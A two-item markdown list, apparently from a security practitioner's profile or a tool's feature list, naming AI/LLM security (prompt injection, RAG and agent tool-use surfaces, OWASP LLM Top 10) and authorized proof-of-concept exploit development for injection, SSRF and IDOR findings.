- **AI / LLM security** — prompt injection in AI-backed web endpoints, RAG/agent tool-use surfaces, OWASP LLM Top 10.
- **Exploit development** — turning a confirmed injection/SSRF/IDOR into a minimal authorized PoC.
